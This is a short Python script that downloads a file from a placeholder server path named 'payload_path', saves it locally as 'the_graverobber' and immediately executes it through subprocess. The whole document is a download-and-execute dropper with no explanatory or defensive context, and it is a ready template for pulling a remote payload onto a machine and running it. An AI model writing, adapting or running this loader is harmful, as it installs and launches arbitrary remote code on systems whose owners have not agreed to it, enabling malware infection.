import subprocess
import requests

data = requests.get("http://your-server.com/payload_path/file")
with open("the_graverobber", "wb") as fl:
    fl.write(data.content)
subprocess.Popen(args="", executable="the_graverobber")
